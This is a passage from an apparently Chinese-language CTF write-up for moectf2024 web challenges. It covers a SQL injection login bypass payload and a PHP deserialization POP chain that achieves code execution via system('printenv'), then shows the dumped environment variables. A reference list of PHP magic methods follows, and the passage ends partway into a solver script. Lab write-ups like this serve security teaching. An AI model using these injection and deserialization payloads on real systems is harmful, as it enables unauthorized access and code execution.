class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_email&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;登陆成功，moectf&#123;testflag&#125;&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;管理员邮箱或密码错误&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>email必须含有邮箱格式，而且不能出现忽略大小写的or</p><p>前者很好办，只要有格式就行，没说必须整个输入都这样；or用||替代，用引号注入注释掉密码，输入验证码即可</p><p>payload为<a href="mailto:&#x31;&#x32;&#50;&#64;&#49;&#49;&#50;&#x2e;&#x63;&#111;&#x6d;">&#x31;&#x32;&#50;&#64;&#49;&#49;&#50;&#x2e;&#x63;&#111;&#x6d;</a>‘ || 1&#x3D;1 #</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/%E7%94%B5%E9%99%A23.png" alt="电院3"></p><h2 id="pop-moe"><a href="#pop-moe" class="headerlink" title="pop moe"></a><strong>pop moe</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$payl0ad</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;payl0ad === <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;FAILED TO ATTACK&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;what;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;payload = <span class="variable language_">$this</span>-&gt;payl0ad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dangerous</span>(<span class="params"><span class="variable">$whaattt</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whaattt</span>-&gt;<span class="title function_ invoke__">evvval</span>(<span class="variable">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evvval</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mystr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很经典的PHP链子，一堆有机联系的类，还有一个unserialize</p><p>大体上思路都是传参一个序列化后的对象，然后通过其实例化类，在类之间层层传递，最后利用类中的危险函数rce之类的；</p><p><strong>Payload:</strong></p><p>O:8:”class000”:2:{s:7:”payl0ad”;s:1:”m”;s:4:”what”;O:8:”class001”:2:{s:7:”payl0ad”;s:9:”<strong>dangerous</strong>“;s:1:”a”;O:8:”class002”:1:{s:3:”sec”;O:8:”class003”:1:{s:5:”mystr”;s:19:”system(“printenv”);”;}}}}</p><p>最后在环境变量里面找到：</p><p>KUBERNETES_PORT&#x3D;tcp:&#x2F;&#x2F;10.43.0.1:443 KUBERNETES_SERVICE_PORT&#x3D;443 USER&#x3D;www-data HOSTNAME&#x3D;ret2shell-35-1510 PHP_INI_DIR&#x3D;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php SHLVL&#x3D;3 HOME&#x3D;&#x2F;home&#x2F;www-data PHP_LDFLAGS&#x3D;-Wl,-O1 -pie PHP_CFLAGS&#x3D;-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS&#x3D;64 PHP_VERSION&#x3D;8.3.10 GPG_KEYS&#x3D;1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA PHP_CPPFLAGS&#x3D;-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS&#x3D;64 PHP_ASC_URL&#x3D;<a href="https://www.php.net/distributions/php-8.3.10.tar.xz.asc">https://www.php.net/distributions/php-8.3.10.tar.xz.asc</a> PHP_URL&#x3D;<a href="https://www.php.net/distributions/php-8.3.10.tar.xz">https://www.php.net/distributions/php-8.3.10.tar.xz</a> KUBERNETES_PORT_443_TCP_ADDR&#x3D;10.43.0.1 PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin KUBERNETES_PORT_443_TCP_PORT&#x3D;443 KUBERNETES_PORT_443_TCP_PROTO&#x3D;tcp KUBERNETES_SERVICE_PORT_HTTPS&#x3D;443 KUBERNETES_PORT_443_TCP&#x3D;tcp:&#x2F;&#x2F;10.43.0.1:443 PHPIZE_DEPS&#x3D;autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c KUBERNETES_SERVICE_HOST&#x3D;10.43.0.1 PWD&#x3D;&#x2F;var&#x2F;www&#x2F;html PHP_SHA256&#x3D;a0f2179d00931fe7631a12cbc3428f898ca3d99fe564260c115af381d2a1978d FLAG&#x3D;<strong>moectf{lT-s3Ems_Th@T-YOu-Know_whAT-IS_POP_1N-phPPPpPPp!!!96}</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解释：</span><br><span class="line">O标识实例化的类对象,8是对象名的长度,class000是对象名称，2指的是有几个键值对；都需要用:隔开；键值对之间用;隔开，然后对象后边不需要;s表示字符串；</span><br></pre></td></tr></table></figure><p>魔术方法在这种链子的题目里面经常用到，是不同的类之间的跳板，总结一下php常用的魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="title function_ invoke__">__construct</span>()</span><br><span class="line">描述: 构造方法，在创建对象时调用。</span><br><span class="line">调用条件: 使用 <span class="keyword">new</span> 关键字实例化类时自动调用。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object created!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();  <span class="comment">// 输出: Object created!</span></span><br><span class="line"><span class="number">2</span>. <span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">描述: 析构方法，在对象销毁时调用。</span><br><span class="line">调用条件: 对象超出作用域或 <span class="keyword">unset</span>() 被调用时自动执行。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object destroyed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>);  <span class="comment">// 输出: Object destroyed!</span></span><br><span class="line"><span class="number">3</span>. <span class="title function_ invoke__">__call</span>(<span class="variable">$name</span>, <span class="variable">$arguments</span>)</span><br><span class="line">描述: 当调用一个不存在或不可访问的方法时被调用。</span><br><span class="line">调用条件: 使用对象调用一个不存在的方法。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Method &#x27;<span class="subst">$name</span>&#x27; does not exist.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();  <span class="comment">// 输出: Method &#x27;nonExistentMethod&#x27; does not exist.</span></span><br><span class="line"><span class="number">4</span>. <span class="title function_ invoke__">__callStatic</span>(<span class="variable">$name</span>, <span class="variable">$arguments</span>)</span><br><span class="line">描述: 当调用一个不存在或不可访问的静态方法时被调用。</span><br><span class="line">调用条件: 使用类名调用不存在的静态方法。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Static method &#x27;<span class="subst">$name</span>&#x27; does not exist.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Example</span>::<span class="title function_ invoke__">nonExistentStaticMethod</span>();  <span class="comment">// 输出: Static method &#x27;nonExistentStaticMethod&#x27; does not exist.</span></span><br><span class="line"><span class="number">5</span>. <span class="title function_ invoke__">__get</span>(<span class="variable">$name</span>)</span><br><span class="line">描述: 当访问一个不可访问或不存在的属性时被调用。</span><br><span class="line">调用条件: 尝试读取一个不可访问或未定义的属性。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="string">&quot;Some data&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Property &#x27;<span class="subst">$name</span>&#x27; does not exist.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;nonExistentProperty;  <span class="comment">// 输出: Property &#x27;nonExistentProperty&#x27; does not exist.</span></span><br><span class="line"><span class="number">6</span>. <span class="title function_ invoke__">__set</span>(<span class="variable">$name</span>, <span class="variable">$value</span>)</span><br><span class="line">描述: 当设置一个不可访问或不存在的属性时被调用。</span><br><span class="line">调用条件: 尝试写入一个不可访问或未定义的属性。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Setting &#x27;<span class="subst">$name</span>&#x27; to &#x27;<span class="subst">$value</span>&#x27;.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;nonExistentProperty = <span class="string">&quot;Test&quot;</span>;  <span class="comment">// 输出: Setting &#x27;nonExistentProperty&#x27; to &#x27;Test&#x27;.</span></span><br><span class="line"><span class="number">7</span>. <span class="title function_ invoke__">__isset</span>(<span class="variable">$name</span>)</span><br><span class="line">描述: 当使用 <span class="keyword">isset</span>() 或 <span class="keyword">empty</span>() 检查一个不可访问或不存在的属性时被调用。</span><br><span class="line">调用条件: 使用 <span class="keyword">isset</span>() 或 <span class="keyword">empty</span>() 检查属性。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;nonExistentProperty));  <span class="comment">// 输出: bool(false)</span></span><br><span class="line"><span class="number">8</span>. <span class="title function_ invoke__">__unset</span>(<span class="variable">$name</span>)</span><br><span class="line">描述: 当尝试删除一个不可访问或不存在的属性时被调用。</span><br><span class="line">调用条件: 使用 <span class="keyword">unset</span>() 删除属性。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Unsetting &#x27;<span class="subst">$name</span>&#x27;.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>-&gt;nonExistentProperty);  <span class="comment">// 输出: Unsetting &#x27;nonExistentProperty&#x27;.</span></span><br><span class="line"><span class="number">9</span>. <span class="title function_ invoke__">__toString</span>()</span><br><span class="line">描述: 当对象被当作字符串使用时被调用。</span><br><span class="line">调用条件: 在上下文中需要字符串表示的对象（如 <span class="keyword">echo</span> 或 <span class="keyword">print</span>）。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This is a string representation of the object.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;  <span class="comment">// 输出: This is a string representation of the object.</span></span><br><span class="line"><span class="number">10</span>. <span class="title function_ invoke__">__invoke</span>()</span><br><span class="line">描述: 当对象被当作函数调用时被调用。</span><br><span class="line">调用条件: 使用对象名并加括号（如同函数调用）。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Called with parameter: <span class="subst">$param</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>(<span class="string">&quot;test&quot;</span>);  <span class="comment">// 输出: Called with parameter: test</span></span><br><span class="line"><span class="number">11</span>. <span class="title function_ invoke__">__clone</span>()</span><br><span class="line">描述: 当对象被克隆时调用。</span><br><span class="line">调用条件: 使用 <span class="keyword">clone</span> 关键字克隆对象。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object cloned!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">clone</span> <span class="variable">$obj1</span>;  <span class="comment">// 输出: Object cloned!</span></span><br><span class="line"><span class="number">12</span>. <span class="title function_ invoke__">__sleep</span>() 和 <span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line">描述: <span class="title function_ invoke__">__sleep</span>() 在对象序列化前调用，<span class="title function_ invoke__">__wakeup</span>() 在对象反序列化后调用。</span><br><span class="line">调用条件: 分别在 <span class="title function_ invoke__">serialize</span>() 和 <span class="title function_ invoke__">unserialize</span>() 时调用。</span><br><span class="line">示例:</span><br><span class="line">php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span> = <span class="string">&quot;Some data&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;data&#x27;</span>];  <span class="comment">// 指定序列化的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Object restored!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);  <span class="comment">// 序列化</span></span><br><span class="line"><span class="variable">$obj2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);  <span class="comment">// 反序列化，输出: Object restored!</span></span><br></pre></td></tr></table></figure><h2 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="headerlink" title="勇闯铜人阵"></a><strong>勇闯铜人阵</strong></h2><p>这题只要搞懂玩法写一个脚本就可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 